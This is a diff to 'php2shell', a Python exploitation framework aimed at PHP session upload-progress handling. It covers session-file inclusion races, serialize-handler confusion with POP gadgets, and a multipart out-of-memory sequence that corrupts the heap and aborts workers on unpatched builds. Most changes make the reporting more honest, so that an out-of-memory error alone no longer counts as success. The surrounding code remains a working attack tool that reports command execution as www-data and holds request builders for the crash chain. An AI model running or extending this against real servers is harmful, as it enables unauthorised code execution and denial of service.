@@ -1,17 +1,25 @@
 #!/usr/bin/env python3
 """
-php2shell v15.0.0 -- session.upload_progress / unserialize exploitation framework.
+php2shell v17.0.0 -- session.upload_progress / unserialize exploitation framework.
 
 Categories
   A  LFI race        session filename injection + slow-upload race + include
   B  Handler mismatch cross-dir serialize_handler confusion + POP gadget
-  C  unserialize()   back-reference overflow probe (detection; no stock-PHP RCE)
+  C  Memory          out-of-memory during multipart parsing followed by a
+                     progress-only request (allocator corruption and a worker
+                     abort on unpatched builds; no code execution), plus an
+                     unserialize() back-reference probe (detection only)
 
-Every behaviour here was validated against the bundled three-container lab:
+A and B are application-level. They need an include sink, or two endpoints with
+different session serialize handlers plus a loaded gadget class. They are not
+CVE-2026-109618 or CVE-2026-109619, and a PHP upgrade does not remove them.
+
+What was observed in the lab (see README.md and ERRATA.md):
 
   A  uid=33(www-data)                     session file included mid-upload
   B  __destruct fired -> uid=33(www-data)  seed(php_serialize) -> fire(php)
-  C  decodes, no corruption on stock 8.1   detection only, by design
+  C  "zend_mm_heap corrupted" and a worker abort on PHP 8.4.26, neither on the
+     patched builds; the unserialize() probe decodes without corruption on 8.1
 
 Constraints discovered on real PHP 8.1 and encoded below:
   * session.save_path is rarely /tmp -- it must be discovered, not assumed.
@@ -37,6 +45,24 @@ except ImportError:
     sys.exit("[!] pip install requests")
 
 VERSION = "17.0.0"
+
+# Returned by a method that reached its precondition (for Category C, an
+# out-of-memory error) but cannot tell whether anything followed. It is truthy
+# on purpose: the method chain stops and the later steps are skipped exactly as
+# they are when a method lands, so the requests sent do not change. Only the
+# wording of the outcome differs.
+PRECONDITION_ONLY = "precondition only"
+
+
+def outcome_text(category, outcome):
+    """How a category's outcome is worded in the summaries."""
+    if outcome == PRECONDITION_ONLY:
+        return "precondition only (out-of-memory reached, corruption not verified)"
+    if not outcome:
+        return "no result"
+    if category == "C":
+        return "corruption or crash signal (not code execution)"
+    return "command execution"
 
 FIXED = {"8.5": (8, 5, 12), "8.4": (8, 4, 27), "8.3": (8, 3, 36), "8.2": (8, 2, 35)}
 
@@ -689,13 +715,16 @@ def self_test(args):
         else:
             ok = category_c(url, s, res, args)
         res.summary()
-        results[name] = {"url": url, "rce": ok, "findings": len(res.findings)}
+        results[name] = {"url": url, "landed": ok, "findings": len(res.findings)}
         if args.output:
             res.save(args.output.replace(".json", "_%s.json" % name))
     print("\n" + "=" * 62)
     for k, v in results.items():
+        # A and B end in command execution; the C probe can only show a crash.
+        label = ("crash signal", "no crash signal") if k == "C" \
+            else ("command execution", "no command execution")
         print("  Category %s: %s (%d findings) -> %s"
-              % (k, "RCE" if v["rce"] else "no RCE", v["findings"], v["url"]))
+              % (k, label[0] if v["landed"] else label[1], v["findings"], v["url"]))
     print("=" * 62)
     return results
 
@@ -716,6 +745,11 @@ def try_methods(res, label, methods, deadline, skip=()):
             ok, detail = fn()
         except Exception as e:
             ok, detail = False, "exception: %s" % e
+        if ok == PRECONDITION_ONLY:
+            res.add("method_%s_%s" % (label, name), "info",
+                    "precondition only: " + str(detail)[:300])
+            print("  [%s] %s reached its precondition only; no result claimed" % (label, name))
+            return PRECONDITION_ONLY
         res.add("method_%s_%s" % (label, name),
                 "critical" if ok else "info",
                 ("LANDED " if ok else "failed ") + str(detail)[:300])
@@ -822,20 +856,45 @@ def c_assess(info, res):
 
 
 def c_heap_corrupt(url, s, res, args):
-    """Calif's request A -> request B corruption chain.
+    """The request A -> request B sequence from Calif's PHP2Shell research.
 
     A: chunked multipart, PHP_SESSION_UPLOAD_PROGRESS + unique nested
-       filename="" records. The hash insert OOMs after nNumUsed++ but before
-       the bucket key is written, so teardown later walks an uninitialised
-       bucket. If parsing fatals before modules_activated, session RSHUTDOWN is
-       skipped while the request heap is freed -- PS(id)/PS(http_session_vars)
-       survive as danglers.
-    B: multipart with the progress field and NO file part. END cleanup reaches
-       php_session_initialize -> zval_ptr_dtor on the freed session value.
+       filename="" records, sized to exhaust memory_limit while PHP is still
+       parsing the request.
+    B: multipart with the progress field and NO file part.
+
+    In the lab this ends with "zend_mm_heap corrupted" and a worker abort on
+    PHP 8.4.26, and with an ordinary OOM error and nothing else on the patched
+    builds. The published account is that the OOM interrupts a hash insert
+    after nNumUsed++ and that session state outlives the request heap. That is
+    the advisory's and Calif's explanation: this method observes the outcome
+    and does not establish where the corruption is created.
+
+    An OOM alone is not corruption, and every patched build reaches it. This
+    method cannot see the server's log on its own, so without --verify-cmd it
+    reports the OOM as a precondition and does not claim a result.
     """
     import subprocess as _sp
     import uuid as _uuid
     parts, depth = args.heap_parts, args.heap_depth
+
+    def corruption_lines():
+        """Lines of the verify command's output carrying the allocator message.
+
+        None when there is no verify command or it could not be run.
+        """
+        if not args.verify_cmd:
+            return None
+        try:
+            out = _sp.run(args.verify_cmd, shell=True, capture_output=True,
+                          timeout=30).stdout.decode("utf-8", "replace")
+        except Exception as e:
+            res.add("verify_error", "info", str(e))
+            return None
+        # The allocator's message is a line of its own. A quoted request line
+        # that merely contains the phrase (a URL or User-Agent) does not count.
+        return [line for line in out.splitlines()
+                if line.strip().endswith("zend_mm_heap corrupted") and '"' not in line]
 
     def req_a():
         b = "----a" + _uuid.uuid4().hex
@@ -872,6 +931,9 @@ def c_heap_corrupt(url, s, res, args):
         return True
 
     print("  [C] A->B chain: %d parts x depth %d, %d rounds" % (parts, depth, args.heap_rounds))
+    # Read the log before as well as after: a corruption line left by an earlier
+    # run must not confirm this one.
+    seen_before = corruption_lines()
     ooms = 0
     for _ in range(args.heap_rounds):
         if req_a():
@@ -879,28 +941,42 @@ def c_heap_corrupt(url, s, res, args):
         req_b()
 
     if ooms:
-        res.add("heap_oom_bucket", "high",
-                "OOM in request parsing on %d/%d rounds (bucket path)"
+        res.add("heap_oom_bucket", "info",
+                "OOM during request parsing on %d/%d rounds "
+                "(a precondition, not evidence of corruption)"
                 % (ooms, args.heap_rounds))
 
     if args.verify_cmd:
-        try:
-            out = _sp.run(args.verify_cmd, shell=True, capture_output=True,
-                          timeout=30).stdout.decode("utf-8", "replace")
-        except Exception as e:
-            out = ""
-            res.add("verify_error", "info", str(e))
-        hits = ("zend_mm_heap corrupted" in out) or ("exit signal Abort" in out)
-        if hits:
-            res.add("heap_corruption_confirmed", "critical",
-                    "target heap corrupted (zend_mm_heap corrupted / worker abort)",
-                    evidence=out.strip().splitlines()[-1][:200] if out.strip() else "")
-            return True, "heap corruption confirmed by log verification"
+        seen_after = None
+        if seen_before is not None:
+            time.sleep(1.0)  # let the dying worker's message reach the log
+            seen_after = corruption_lines()
+        if seen_before is None or seen_after is None:
+            why = "the verify command could not be run"
+        else:
+            new = len(seen_after) - len(seen_before)
+            if new > 0:
+                res.add("heap_corruption_confirmed", "critical",
+                        "allocator reported corruption during this run "
+                        "(%d new 'zend_mm_heap corrupted' line(s))" % new,
+                        evidence=seen_after[-1][:200])
+                return True, "heap corruption confirmed by log verification"
+            if new < 0:
+                res.add("verify_log_shrank", "info",
+                        "the verify command printed fewer corruption lines after the run "
+                        "than before it; it must print the whole log, not a tail")
+                why = "the verify command's output shrank during the run"
+            else:
+                why = "no new corruption line in the verify command's output"
         if ooms:
-            return False, "OOM reached, corruption not confirmed by verify command"
+            # As before: with a verify command, an unconfirmed OOM is a failure
+            # and the chain moves on to the next method.
+            return False, "OOM reached, corruption not confirmed: %s" % why
 
     if ooms:
-        return True, "OOM at bucket allocation -> stale bucket teardown path"
+        # As before, the chain stops here. It used to be reported as a success.
+        return PRECONDITION_ONLY, ("OOM reached; corruption not verified (pass --verify-cmd "
+                                   "with a command that prints the server's whole error log)")
     return False, "no OOM at %d parts x depth %d" % (parts, depth)
 
 
@@ -1104,7 +1180,7 @@ def run_all(args):
     print("\n" + "=" * 62)
     print("  ALL-CATEGORY RUN")
     for k in ("A", "B", "C"):
-        print("  Category %s: %s" % (k, "RCE/PROVEN" if table[k] else "no result"))
+        print("  Category %s: %s" % (k, outcome_text(k, table[k])))
     print("=" * 62)
     if args.output:
         for k, r in (("A", ra), ("B", rb), ("C", rc)):
@@ -1164,11 +1240,14 @@ def orchestrate(url, s, res, info, args):
     print("  METHOD MATRIX")
     for cat in ("A", "B", "C"):
         if cat in landed:
-            print("  Category %s: %s" % (cat, "LANDED" if landed[cat] else "all methods failed"))
+            print("  Category %s: %s" % (cat, outcome_text(cat, landed[cat]) if landed[cat]
+                                         else "all methods failed"))
         else:
             print("  Category %s: not applicable (precondition absent)" % cat)
     print("=" * 62)
-    return any(landed.values())
+    if any(v is True for v in landed.values()):
+        return True
+    return PRECONDITION_ONLY if any(landed.values()) else False
 
 
 def environ_poison(endpoint, param, s, res, args):
@@ -1252,7 +1331,9 @@ def main():
     p.add_argument("--heap-depth", dest="heap_depth", type=int, default=45)
     p.add_argument("--heap-rounds", dest="heap_rounds", type=int, default=3)
     p.add_argument("--verify-cmd", dest="verify_cmd", default=None,
-                   help="shell command to confirm corruption, e.g. grep of the error log")
+                   help="shell command that prints the server's whole error log (not a "
+                        "tail); a new 'zend_mm_heap corrupted' line during the run "
+                        "confirms corruption")
     p.add_argument("--oom-mem", dest="oom_mem", default=None)
     p.add_argument("--log-path", default=None)
     p.add_argument("--allow-log-poison", dest="allow_log_poison",
@@ -1336,7 +1417,10 @@ def main():
         res.summary()
         if args.output:
             res.save(args.output)
-        print("\nRESULT: %s" % ("SUCCESS" if ok else "no exploitation achieved"))
+        if ok == PRECONDITION_ONLY:
+            print("\nRESULT: no result (out-of-memory reached, corruption not verified)")
+        else:
+            print("\nRESULT: %s" % ("SUCCESS" if ok else "no exploitation achieved"))
         return 0
     except KeyboardInterrupt:
         print("\n[!] interrupted")
